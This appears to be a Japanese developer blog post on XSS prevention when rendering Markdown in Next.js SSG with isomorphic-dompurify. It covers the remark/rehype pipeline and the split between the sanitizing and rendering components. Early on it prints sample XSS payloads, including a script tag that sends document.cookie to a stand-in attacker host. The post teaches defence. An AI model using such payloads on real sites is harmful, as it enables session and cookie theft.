---
title: 'Markdown を DOMPurify で安全にレンダリングする：Next.js SSG の XSS 対策'
description: 'Next.js SSG で Markdown を HTML 化して dangerouslySetInnerHTML で描画する際の XSS リスクを解説し、DOMPurify（isomorphic-dompurify）によるサニタイズとリポジトリ規約に沿った責務分離設計を紹介します。'
slug: 'markdown-dompurify-sanitize'
publishedAt: '2026-06-14'
author: 'なぎゆー'
tags: ['Next.js', 'セキュリティ', 'Markdown']
categories: ['nextjs']
---

## はじめに

Markdown で書いたコンテンツを Next.js の SSG で HTML に変換して配信する構成は、技術ブログやドキュメントサイトでよく使われます。この nagiyu ポータルもそのひとつです。シンプルで使いやすい構成ですが、生成した HTML を `dangerouslySetInnerHTML` で描画する以上、XSS（Cross-Site Scripting）のリスクとどう向き合うかを意識しておく必要があります。

本記事では、nagiyu ポータルが採用している「**remark/rehype でパイプライン変換 → DOMPurify でサニタイズ → コンポーネントで描画**」という設計を解説します。コードそのものは比較的シンプルです。大事なのは「なぜこの構成にしたか」の設計判断なので、そこを中心に書いていきます。

## XSS とは何か：Markdown レンダリングの文脈で

XSS とは、攻撃者が用意したスクリプトをページに埋め込み、閲覧者のブラウザ上で実行させる攻撃です。Markdown をサーバーサイドで安全に変換していても、変換後の HTML に危険なタグや属性が残っていると問題になります。

たとえば Markdown の中に次のような HTML が含まれていたとします。

```markdown
<!-- Markdown ファイルの中に生 HTML が混在している例 -->
<img src="x" onerror="alert('XSS')" />

<a href="javascript:void(document.cookie)">クリックしてください</a>

<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
```

これらが変換後の HTML にそのまま残り `dangerouslySetInnerHTML` で展開されると、ページを開いた瞬間にスクリプトが実行されます。

DOMPurify はこの「残ってしまった危険な要素」を除去するライブラリです。上の例それぞれが除去されるとどうなるか示します。

| 入力 HTML                          | DOMPurify 後                             |
| ---------------------------------- | ---------------------------------------- |
| `<img src="x" onerror="alert(1)">` | `<img src="x">` （`onerror` 属性を除去） |
| `<a href="javascript:void(...)">`  | `<a>` （`javascript:` スキームを除去）   |
| `<script>...</script>`             | 空（`script` タグごと除去）              |
| `<iframe src="...">`               | 空（許可リストにないタグを除去）         |

DOMPurify はデフォルトで「安全な HTML 要素・属性の許可リスト」を持ち、それ以外をすべて除去します。`onerror` などのイベントハンドラ属性、`javascript:` URI、`<script>` / `<iframe>` のような危険なタグが対象です。

## nagiyu ポータルの実装

### 変換パイプライン（lib/content.ts）

```typescript
import { remark } from 'remark';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeStringify from 'rehype-stringify';
import DOMPurify from 'isomorphic-dompurify';

async function markdownToHtml(markdown: string): Promise<string> {
  const result = await remark()
    .use(remarkGfm)
    .use(remarkRehype)
    .use(rehypeStringify)
    .process(markdown);
  return DOMPurify.sanitize(result.toString());
}
```

コード自体は短いですが、各ステップには意図があります。

| ステップ      | ライブラリ              | 役割                                                                         |
| ------------- | ----------------------- | ---------------------------------------------------------------------------- |
| Markdown 解析 | `remark` + `remark-gfm` | Markdown を構文木（mdast）へ変換。GFM 拡張（表・チェックボックス等）を有効化 |
| HTML 変換     | `remark-rehype`         | mdast を HTML 構文木（hast）へ変換                                           |
| HTML 文字列化 | `rehype-stringify`      | hast を HTML 文字列へ直列化                                                  |
| サニタイズ    | `DOMPurify.sanitize()`  | 危険な要素・属性を除去                                                       |

### 描画コンポーネント（MarkdownContent.tsx）

```typescript
interface MarkdownContentProps {
  /** DOMPurify でサニタイズ済みの HTML 文字列（lib/content.ts で処理済み） */
  html: string;
  sx?: SxProps<Theme>;
}

/**
 * サニタイズ済み Markdown HTML をレンダリングするコンポーネント
 *
 * コンテンツは lib/content.ts の markdownToHtml() で DOMPurify.sanitize() 済みです。
 */
export default function MarkdownContent({ html, sx }: MarkdownContentProps) {
  return (
    <Box
      dangerouslySetInnerHTML={{ __html: html }}
      sx={[DEFAULT_CONTENT_SX, ...(sx == null ? [] : Array.isArray(sx) ? sx : [sx])]}
    />
  );
}
```

このコンポーネントは `html` prop（サニタイズ済み）を受け取り、MUI の `Box` に流し込むだけです。描画側にサニタイズのロジックはありません。

## 設計上のポイント

### 1. 二重防御：remark-rehype のデフォルト挙動 + DOMPurify

`remark-rehype` は `allowDangerousHtml: true` オプションを指定しない限り、Markdown 中の生 HTML を**素通ししません**。通常の Markdown テキストであればそもそも危険な HTML は変換後に含まれないため、DOMPurify が取り除く対象は実質ゼロになります。

それでも DOMPurify を最終段に置いている理由は、**将来のリスクを構造的に遮断する**ためです。たとえば次のような状況を考えます。

- `remark-rehype` を `{ allowDangerousHtml: true }` に変更した
- remark/rehype の拡張プラグインを追加した
- 別のコンテンツソースからの HTML をパイプラインに流すことになった

こうした変更が加わったとき、DOMPurify がなければ即座に XSS の経路が生まれます。DOMPurify が最終段にいれば、仮に途中の設定が変わっても最後のゲートが防いでくれます。「現状は問題ない」ではなく「変化があっても安全」を担保する、多層防御の考え方です。

### 2. isomorphic-dompurify を使う理由

素の `dompurify` はブラウザの `window` と DOM API を前提に動作します。Node.js 環境（SSG のビルド時）には `window` がないため、そのまま使うと実行時エラーになります。

```
ReferenceError: window is not defined
```

`isomorphic-dompurify` は内部で `jsdom` を使い、Node.js でも `DOMPurify.sanitize()` を呼べるようにしたパッケージです。ブラウザではネイティブの DOM を、Node.js では jsdom を使うよう自動で切り替えてくれます。

nagiyu ポータルでは `generateStaticParams` と SSG によって**すべての記事ページがビルド時に生成**されます。`markdownToHtml()` が呼ばれるのはビルド時のみで、ランタイムに実行されることはありません。`isomorphic-dompurify` はまさにこのユースケースのためにあります。

### 3. 責務分離：コンテンツ変換とコンポーネント描画を切り離す

このリポジトリの CLAUDE.md（コーディング規約）には次の項目があります。

> **MUST NOT**: `dangerouslySetInnerHTML` を直接使用しない（DOMPurify 経由のみ）

「DOMPurify 経由のみ」とはどういう意味でしょうか。答えは「`dangerouslySetInnerHTML` に渡す HTML は必ずサニタイズ済みであること」です。

nagiyu ポータルはこれを**境界設計**で実現しています。

```
lib/content.ts          ← サニタイズの責務
  markdownToHtml()
    remark → rehype → HTML 文字列
    DOMPurify.sanitize()  ← ここで完結
    return sanitizedHtml

components/MarkdownContent.tsx  ← 描画の責務
  props: { html: string }       ← 「サニタイズ済み」が前提
  <Box dangerouslySetInnerHTML={{ __html: html }} />
```

`MarkdownContent` コンポーネントは「渡されてきた HTML は安全なもの」という前提で動いています。逆に言えば、`lib/content.ts` 以外から生の HTML を `MarkdownContent` に渡してはいけないということでもあります。この境界をコードの構造として明確にしておくことで、「後から誰かがサニタイズなしで使う」ミスが起きにくくなります。

コンポーネントの JSDoc にも「コンテンツは lib/content.ts の markdownToHtml() で DOMPurify.sanitize() 済み」と明記しているのは、この境界を次の開発者に伝えるためです。

## ビルド時サニタイズの利点

SSG との組み合わせで得られる利点のひとつが、**ランタイムに一切オーバーヘッドがない**ことです。

DOMPurify のサニタイズは内部で DOM の構築と解析を行うため、コンテンツの量によってはそれなりの時間がかかります。毎リクエストでこれを実行する SSR / API Routes では無視できないコストになることがあります。

SSG の場合、このコストは `next build` 時に 1 度だけ支払います。生成された HTML ファイルは完全にサニタイズ済みの静的ファイルとして CDN に配置され、ユーザーへのレスポンスは純粋な静的ファイル配信になります。記事が 100 本あれば 100 回サニタイズが走りますが、それはビルドのみで、リクエスト時には何も走りません。

## ハマったポイント

### dompurify → isomorphic-dompurify への移行

最初は素の `dompurify` を入れて試していました。ローカルの `next dev`（ブラウザ側で動く部分）では問題が出ず、`next build` を走らせた瞬間に `ReferenceError: window is not defined` でコケます。

```
Error: Cannot find module 'dompurify'
  or
ReferenceError: window is not defined
```

SSG では `generateStaticParams` が Node.js プロセス上で実行されるため、`window` 前提のコードは動きません。`isomorphic-dompurify` に差し替えたところ、`npm install isomorphic-dompurify` だけでビルドが通るようになりました。型定義も同梱されているので `@types/` パッケージは不要です。

### remarkRehype に allowDangerousHtml を付けたくなる誘惑

Markdown の中に `<details>` や `<summary>` タグを使いたいと思ったとき、`remarkRehype({ allowDangerousHtml: true })` を付ければ生 HTML が通るようになります。ただしこれをやると DOMPurify の防衛線が一気に重要になります。

nagiyu ポータルでは現状 `allowDangerousHtml` は使っていませんが、もし将来使うことになっても DOMPurify が最終段にいる設計なので、追加の対応なく安全を保てます。これが「二重防御」を最初から仕込んでおく価値です。

## 依存パッケージ

参考までに、nagiyu ポータルが実際に使っているパッケージのバージョンを示します（`services/portal/web/package.json`）。

```json
{
  "dependencies": {
    "gray-matter": "^4",
    "isomorphic-dompurify": "^3.16",
    "remark": "^15",
    "remark-gfm": "^4",
    "remark-rehype": "^11",
    "rehype-stringify": "^10"
  }
}
```

`remark@15` / `remark-rehype@11` / `rehype-stringify@10` は ESM 専用パッケージです。`package.json` に `"type": "module"` を設定するか、`next.config.ts` 側で `transpilePackages` を設定する必要はなく、Next.js は内部でこれらを扱ってくれます（Next.js 13 以降）。

## まとめ

Markdown を `dangerouslySetInnerHTML` で描画するパターンの XSS 対策として、nagiyu ポータルが採用している設計のポイントを整理します。

1. **remark-rehype のデフォルト設定**で Markdown 中の生 HTML をそもそも通さない
2. **DOMPurify を最終段に配置**して、将来の設定変更や拡張があっても XSS を防ぐ多層防御とする
3. **isomorphic-dompurify** で Node.js（ビルド時）でも `DOMPurify.sanitize()` を動かす
4. **サニタイズと描画の責務を分離**し、`lib/content.ts` でサニタイズを完結、`MarkdownContent` は「受け取った HTML は安全」を前提として動く
5. **SSG でビルド時に 1 回サニタイズ**するため、ランタイムのオーバーヘッドがゼロ

「DOMPurify を入れておけば安全」ではなく、「どこで・誰が・どのタイミングでサニタイズするか」を設計として決めておくことが重要です。境界が明確であれば、後から見た開発者もルールを理解しやすくなります。
